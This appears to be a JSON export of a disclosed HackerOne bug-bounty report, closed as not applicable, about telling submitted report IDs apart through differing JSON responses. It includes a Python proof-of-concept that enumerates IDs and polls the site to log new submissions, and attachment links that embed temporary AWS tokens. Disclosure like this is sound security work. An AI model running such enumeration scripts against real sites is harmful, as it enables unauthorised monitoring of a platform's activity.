@@ -1,0 +1,207 @@
+{
+  "id": 159890,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTk4OTA=",
+  "url": "https://hackerone.com/reports/159890",
+  "title": "Ability to monitor reports' submission in real time",
+  "state": "Closed",
+  "substate": "not-applicable",
+  "readable_substate": "N/A",
+  "created_at": "2016-08-17T00:59:11.910Z",
+  "submitted_at": "2016-08-17T00:59:11.910Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "saeedhashem",
+    "url": "/saeedhashem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/dqig4qi42s2157w6yhmebkraz08m/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-08-17T08:02:00.458Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-08-17T03:29:22.019Z",
+  "team_member_agreed_on_going_public_at": "2016-08-17T08:02:00.369Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey ,\n\nI would like to report an issue with the server responses that allow anyone users to monitor and track the reports' submission and the platform activity .\n\n##Description :\n\nThe issue occurs on the endpoint '/reports/[report_id].json' due to the difference between server responses for submitted reports and  the yet not submitted ones .\n\nIf the report is already submitted and the logged in user has no access to it the html response will return a message saying `Oops! You can't access this report because it isn't public yet.` and the JSON response will return a blank page , zero length .\n\nAnd if the report id passed to the endpoint hasn't been submitted yet , the HTML response will return a not found page , and the JSON response will return `{\"status\":\"404\",\"error\":\"Not Found\"}` .\n\n##PoC :\n\nI wrote a simple python script can exploit this behaviour , it's my first pentesting python script by the way , sorry for the poor coding , I just learned how to do this today but you'll get the idea  :\n\n```\nimport requests\nimport time\nfrom datetime import datetime\n\nstart = raw_input(\"\\nEnter the last report you know about [Ignore if before #159875]: \")\nif start == '' :\n    start = 159874\nelse :\n    start = int(start)\n\nif start < 159874 :\n    start = 159874\n\ndef getReport(report):\n    url = 'https://hackerone.com/reports/%s.json' % str(report)\n    res = requests.get(url)\n    l = len(res.text)\n    if l == 36 :\n        return 0 \n    else:\n        return 1 \n\ndef lastReport(start):\n    for report in range( start ,1000000):\n        if getReport(report):\n            continue\n        else :\n            report = report - 1\n            return report\n\nlast = lastReport(start)\nprint \"\\n[+]Last submitted report is : #%s\\n\" % str(last)\n\ndef getNext(last):\n    report = last + 1\n    if getReport(report):\n        now = datetime.now()\n        print \"Report number #%s has been submited at %s/%s/%s %s:%s\\n\" % (report , now.month, now.day, now.year, now.hour, now.minute)\n        last = report\n        getNext(last)\n    else :\n        time.sleep(30)\n        last = report - 1\n        getNext(last)\n\ngetNext(last)\n```\nAs the markdown missed up the code a bit I'm attaching it in two files \nF112672 => works well on Windows\nF112671 => works well on Linux\n\nThe output of the script would be like :\n\n{F112668}\n{F112670}\n\nBasically it records the date and time of every newly submitted report , of course that can be improved to generate hourly or daily reports about the platform activities , when hackers are mostly active , how frequent reports are submitted on H1 and so on , all is normally undisclosed information , only platform operator should know about .\n\n##Impact :\n\nI think it's too permissive for a highly secure platform to leave a way open for third parties to track its activity and its user interactions with the platform , which considered as privilege information only platform operators should be allowed to get their hands onto .\n\nThank you guys , glad that I've learned something new today specifically for this report , hope it qualifies and worth addressing . \n\nBest regards ,\nThanks ,",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 112668,
+      "file_name": "H1-mon1.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/112/668/56c3efa0c31eaa7a6b95332627d8cd677cf3a798/H1-mon1.PNG?response-content-disposition=attachment%3B%20filename%3D%22H1-mon1.PNG%22%3B%20filename%2A%3DUTF-8%27%27H1-mon1.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRO2C5KGU%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T065441Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICSHi1EUkoMHJafMstn4%2FD6L42zwbhyh9zSIStLinC9PAiEAmVIpUZ8BTt5jvP5khLr6maYlbJVRwOpznsm4X7QJpeoqsgUIfxADGgwwMTM2MTkyNzQ4NDkiDP%2BcR%2BjUxzFUG4jhKyqPBb08%2Bz5Dsnx85A6GKV8hR4OvJLFuxZC5DrbWYX5bhXSL5LRfiLzCPuUto7neZozcROg9w9hYcKRqOCecmAepPDf2nRHYvwzfzOan2WBHmKLgJjO%2FvE1dkX7inxrqYsSquU%2FqXIxK6P%2B8Yqhf4gVHZwjoJS%2BgtFmPQGCS4mLACLL38HyeG%2Fe2Or4mUpgBEkWzuoXyEHHEfFsLMeOSKbMFu82J3qht6z9SnaYq8SySSfCfLRc9sifUKx3Mo7qxP8HRu5VA3ijYr0MXy%2BVJsjDmKxKaXruTlN%2FJsfMnan9AVPpSoQrbThBlcMpWNO3VquUndEfC%2F2S6Cnaa6PFTBQTsPekDd6sYajjYku%2FpFuX0lCfQq4C%2B0hUuutX1fld%2BwSpry3GLKxx5XEfiEh%2Bn%2BurX3V1Sam0n3ek5VJ0aUUZtHn9e%2FnEbYXWUm5KZizYMEARZrAD1m9zTOZa5hP9LTN7P4HLe3cUX%2FsJlVb1%2FSu4oC6yeIiyG7Zy4XmSt1p9hxZeL4q%2FnaTjiGERLD3LB6ZSiZNxEGlMiFAnpyktZ3gZC99ZlcvzF%2B5TozAFcULndzNpPH%2F5epK9HPdhvO2Pt7bzSVdC6S0V204K%2BrYoH%2FKz5qzNNSEU23PYt4PhT3wZ9%2Fhzhrb9glUztfjjR0ISz1d6NSNW%2FmtM5k79MJJSNtp2B4kg1zhyc1x89tfJBtDpnLGSNWUE75AD5MtZ7lnkETU%2FcVicT3GXzdHGzGJjY6wG9pv38MfhRxjhg2X2tOAn2%2FKgey3WE%2BFsXaP7JHM2ThB7EnDK4C9baC8koDTB1gRUeyioP3WVs64xhUourg118CU0hlkVtECCbNSnpz5Q3zMfvBTWbjRhaxaDf31xi2Ir2D7sw3NC30gY6sQGYkjGOx0RiBgKHlHOkwXoxfp5KVLbogGxjedRtRoo1qSNwMNQbQ6W00n1me8eFtYq8%2FWVOaAIYLKZplxHLqLgW6KRNyf%2FCKSOJVzFMzAiNhuXco6F%2FGxoZad1dbJPupsvh3mjhBg1f76l4KD8U1pI4An89NNfW%2BjoEeEi4MFR0soE3rsVwFrBHLsvB1GTwKh%2FeG9S76%2FKfV%2FlpMsQQVcFArZEBCBVb3r%2FoJ%2B3dp0%2Bjgoc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d4f2f0a9c275c64846f80f8e3efa9e03c86a19e2136936010cbda1660109cfe4",
+      "file_size": 21891,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 112670,
+      "file_name": "H1-mon2.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/112/670/c9f22f571b6175b38f7b14858c701813a9f7f355/H1-mon2.PNG?response-content-disposition=attachment%3B%20filename%3D%22H1-mon2.PNG%22%3B%20filename%2A%3DUTF-8%27%27H1-mon2.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRO2C5KGU%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T065441Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICSHi1EUkoMHJafMstn4%2FD6L42zwbhyh9zSIStLinC9PAiEAmVIpUZ8BTt5jvP5khLr6maYlbJVRwOpznsm4X7QJpeoqsgUIfxADGgwwMTM2MTkyNzQ4NDkiDP%2BcR%2BjUxzFUG4jhKyqPBb08%2Bz5Dsnx85A6GKV8hR4OvJLFuxZC5DrbWYX5bhXSL5LRfiLzCPuUto7neZozcROg9w9hYcKRqOCecmAepPDf2nRHYvwzfzOan2WBHmKLgJjO%2FvE1dkX7inxrqYsSquU%2FqXIxK6P%2B8Yqhf4gVHZwjoJS%2BgtFmPQGCS4mLACLL38HyeG%2Fe2Or4mUpgBEkWzuoXyEHHEfFsLMeOSKbMFu82J3qht6z9SnaYq8SySSfCfLRc9sifUKx3Mo7qxP8HRu5VA3ijYr0MXy%2BVJsjDmKxKaXruTlN%2FJsfMnan9AVPpSoQrbThBlcMpWNO3VquUndEfC%2F2S6Cnaa6PFTBQTsPekDd6sYajjYku%2FpFuX0lCfQq4C%2B0hUuutX1fld%2BwSpry3GLKxx5XEfiEh%2Bn%2BurX3V1Sam0n3ek5VJ0aUUZtHn9e%2FnEbYXWUm5KZizYMEARZrAD1m9zTOZa5hP9LTN7P4HLe3cUX%2FsJlVb1%2FSu4oC6yeIiyG7Zy4XmSt1p9hxZeL4q%2FnaTjiGERLD3LB6ZSiZNxEGlMiFAnpyktZ3gZC99ZlcvzF%2B5TozAFcULndzNpPH%2F5epK9HPdhvO2Pt7bzSVdC6S0V204K%2BrYoH%2FKz5qzNNSEU23PYt4PhT3wZ9%2Fhzhrb9glUztfjjR0ISz1d6NSNW%2FmtM5k79MJJSNtp2B4kg1zhyc1x89tfJBtDpnLGSNWUE75AD5MtZ7lnkETU%2FcVicT3GXzdHGzGJjY6wG9pv38MfhRxjhg2X2tOAn2%2FKgey3WE%2BFsXaP7JHM2ThB7EnDK4C9baC8koDTB1gRUeyioP3WVs64xhUourg118CU0hlkVtECCbNSnpz5Q3zMfvBTWbjRhaxaDf31xi2Ir2D7sw3NC30gY6sQGYkjGOx0RiBgKHlHOkwXoxfp5KVLbogGxjedRtRoo1qSNwMNQbQ6W00n1me8eFtYq8%2FWVOaAIYLKZplxHLqLgW6KRNyf%2FCKSOJVzFMzAiNhuXco6F%2FGxoZad1dbJPupsvh3mjhBg1f76l4KD8U1pI4An89NNfW%2BjoEeEi4MFR0soE3rsVwFrBHLsvB1GTwKh%2FeG9S76%2FKfV%2FlpMsQQVcFArZEBCBVb3r%2FoJ%2B3dp0%2Bjgoc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=060ffeeed7ca766cae30850b363579be9b8e93f6a7d560f529386b8b3a4972d5",
+      "file_size": 44786,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 112671,
+      "file_name": "h1-py3.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/112/671/5cfe822a4a6de5ad1ef90fdc07b076292190a40c/h1-py3.py?response-content-disposition=attachment%3B%20filename%3D%22h1-py3.py%22%3B%20filename%2A%3DUTF-8%27%27h1-py3.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRO2C5KGU%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T065441Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICSHi1EUkoMHJafMstn4%2FD6L42zwbhyh9zSIStLinC9PAiEAmVIpUZ8BTt5jvP5khLr6maYlbJVRwOpznsm4X7QJpeoqsgUIfxADGgwwMTM2MTkyNzQ4NDkiDP%2BcR%2BjUxzFUG4jhKyqPBb08%2Bz5Dsnx85A6GKV8hR4OvJLFuxZC5DrbWYX5bhXSL5LRfiLzCPuUto7neZozcROg9w9hYcKRqOCecmAepPDf2nRHYvwzfzOan2WBHmKLgJjO%2FvE1dkX7inxrqYsSquU%2FqXIxK6P%2B8Yqhf4gVHZwjoJS%2BgtFmPQGCS4mLACLL38HyeG%2Fe2Or4mUpgBEkWzuoXyEHHEfFsLMeOSKbMFu82J3qht6z9SnaYq8SySSfCfLRc9sifUKx3Mo7qxP8HRu5VA3ijYr0MXy%2BVJsjDmKxKaXruTlN%2FJsfMnan9AVPpSoQrbThBlcMpWNO3VquUndEfC%2F2S6Cnaa6PFTBQTsPekDd6sYajjYku%2FpFuX0lCfQq4C%2B0hUuutX1fld%2BwSpry3GLKxx5XEfiEh%2Bn%2BurX3V1Sam0n3ek5VJ0aUUZtHn9e%2FnEbYXWUm5KZizYMEARZrAD1m9zTOZa5hP9LTN7P4HLe3cUX%2FsJlVb1%2FSu4oC6yeIiyG7Zy4XmSt1p9hxZeL4q%2FnaTjiGERLD3LB6ZSiZNxEGlMiFAnpyktZ3gZC99ZlcvzF%2B5TozAFcULndzNpPH%2F5epK9HPdhvO2Pt7bzSVdC6S0V204K%2BrYoH%2FKz5qzNNSEU23PYt4PhT3wZ9%2Fhzhrb9glUztfjjR0ISz1d6NSNW%2FmtM5k79MJJSNtp2B4kg1zhyc1x89tfJBtDpnLGSNWUE75AD5MtZ7lnkETU%2FcVicT3GXzdHGzGJjY6wG9pv38MfhRxjhg2X2tOAn2%2FKgey3WE%2BFsXaP7JHM2ThB7EnDK4C9baC8koDTB1gRUeyioP3WVs64xhUourg118CU0hlkVtECCbNSnpz5Q3zMfvBTWbjRhaxaDf31xi2Ir2D7sw3NC30gY6sQGYkjGOx0RiBgKHlHOkwXoxfp5KVLbogGxjedRtRoo1qSNwMNQbQ6W00n1me8eFtYq8%2FWVOaAIYLKZplxHLqLgW6KRNyf%2FCKSOJVzFMzAiNhuXco6F%2FGxoZad1dbJPupsvh3mjhBg1f76l4KD8U1pI4An89NNfW%2BjoEeEi4MFR0soE3rsVwFrBHLsvB1GTwKh%2FeG9S76%2FKfV%2FlpMsQQVcFArZEBCBVb3r%2FoJ%2B3dp0%2Bjgoc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7f1be7f5292408b7ce963ee80252338e59b6da76f31de11e0f904160b16a0fa0",
+      "file_size": 1118,
+      "type": "text/x-python",
+      "moderated": null
+    },
+    {
+      "id": 112672,
+      "file_name": "h1-py2.py",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/112/672/ccf442e6842bea721ba81e0c0d85c28fa74b3ba5/h1-py2.py?response-content-disposition=attachment%3B%20filename%3D%22h1-py2.py%22%3B%20filename%2A%3DUTF-8%27%27h1-py2.py&response-content-type=text%2Fx-python&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRO2C5KGU%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T065441Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCICSHi1EUkoMHJafMstn4%2FD6L42zwbhyh9zSIStLinC9PAiEAmVIpUZ8BTt5jvP5khLr6maYlbJVRwOpznsm4X7QJpeoqsgUIfxADGgwwMTM2MTkyNzQ4NDkiDP%2BcR%2BjUxzFUG4jhKyqPBb08%2Bz5Dsnx85A6GKV8hR4OvJLFuxZC5DrbWYX5bhXSL5LRfiLzCPuUto7neZozcROg9w9hYcKRqOCecmAepPDf2nRHYvwzfzOan2WBHmKLgJjO%2FvE1dkX7inxrqYsSquU%2FqXIxK6P%2B8Yqhf4gVHZwjoJS%2BgtFmPQGCS4mLACLL38HyeG%2Fe2Or4mUpgBEkWzuoXyEHHEfFsLMeOSKbMFu82J3qht6z9SnaYq8SySSfCfLRc9sifUKx3Mo7qxP8HRu5VA3ijYr0MXy%2BVJsjDmKxKaXruTlN%2FJsfMnan9AVPpSoQrbThBlcMpWNO3VquUndEfC%2F2S6Cnaa6PFTBQTsPekDd6sYajjYku%2FpFuX0lCfQq4C%2B0hUuutX1fld%2BwSpry3GLKxx5XEfiEh%2Bn%2BurX3V1Sam0n3ek5VJ0aUUZtHn9e%2FnEbYXWUm5KZizYMEARZrAD1m9zTOZa5hP9LTN7P4HLe3cUX%2FsJlVb1%2FSu4oC6yeIiyG7Zy4XmSt1p9hxZeL4q%2FnaTjiGERLD3LB6ZSiZNxEGlMiFAnpyktZ3gZC99ZlcvzF%2B5TozAFcULndzNpPH%2F5epK9HPdhvO2Pt7bzSVdC6S0V204K%2BrYoH%2FKz5qzNNSEU23PYt4PhT3wZ9%2Fhzhrb9glUztfjjR0ISz1d6NSNW%2FmtM5k79MJJSNtp2B4kg1zhyc1x89tfJBtDpnLGSNWUE75AD5MtZ7lnkETU%2FcVicT3GXzdHGzGJjY6wG9pv38MfhRxjhg2X2tOAn2%2FKgey3WE%2BFsXaP7JHM2ThB7EnDK4C9baC8koDTB1gRUeyioP3WVs64xhUourg118CU0hlkVtECCbNSnpz5Q3zMfvBTWbjRhaxaDf31xi2Ir2D7sw3NC30gY6sQGYkjGOx0RiBgKHlHOkwXoxfp5KVLbogGxjedRtRoo1qSNwMNQbQ6W00n1me8eFtYq8%2FWVOaAIYLKZplxHLqLgW6KRNyf%2FCKSOJVzFMzAiNhuXco6F%2FGxoZad1dbJPupsvh3mjhBg1f76l4KD8U1pI4An89NNfW%2BjoEeEi4MFR0soE3rsVwFrBHLsvB1GTwKh%2FeG9S76%2FKfV%2FlpMsQQVcFArZEBCBVb3r%2FoJ%2B3dp0%2Bjgoc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b2531193dc35f265a66525e8e33f7896ae0264c5ab06e0d15b84da25cc765963",
+      "file_size": 1175,
+      "type": "text/x-python",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 16,
+  "voters": [
+    "k0z3r0",
+    "shubham_srt",
+    "newfunction",
+    "bugdiscloseguys",
+    "malcolmx",
+    "r3y",
+    "dudez",
+    "m16",
+    "saeedhashem",
+    "japz",
+    "and 6 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "159890",
+  "votes": 16,
+  "latest_disclosable_activity_at": "2016-08-17T08:02:00.516Z",
+  "severity": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T14:54:41.195737",
+    "source": "https://hackerone.com/reports/159890.json",
+    "report_id": 159890
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTk4OTA=",
+    "databaseId": "159890",
+    "title": "Ability to monitor reports' submission in real time",
+    "url": "https://hackerone.com/reports/159890",
+    "state": null,
+    "substate": "not-applicable",
+    "disclosed_at": "2016-08-17T08:02:00.458Z",
+    "created_at": "2016-08-17T00:59:11.910Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzc1",
+      "name": "Privilege Escalation",
+      "external_id": "capec-233"
+    },
+    "severity": null,
+    "reporter": {
+      "username": "saeedhashem"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEz",
+      "handle": "security",
+      "name": "HackerOne",
+      "url": "https://hackerone.com/security",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE1OTg5MA==",
+    "_id": "159890",
+    "disclosed": true,
+    "votes": 16,
+    "latest_disclosable_activity_at": "2016-08-17T08:02:00.516Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTk4OTA=",
+      "databaseId": "159890",
+      "title": "Ability to monitor reports' submission in real time",
+      "url": "https://hackerone.com/reports/159890",
+      "disclosed_at": "2016-08-17T08:02:00.458Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEz",
+      "handle": "security",
+      "name": "HackerOne",
+      "url": "https://hackerone.com/security",
+      "currency": "usd"
+    }
+  }
+}
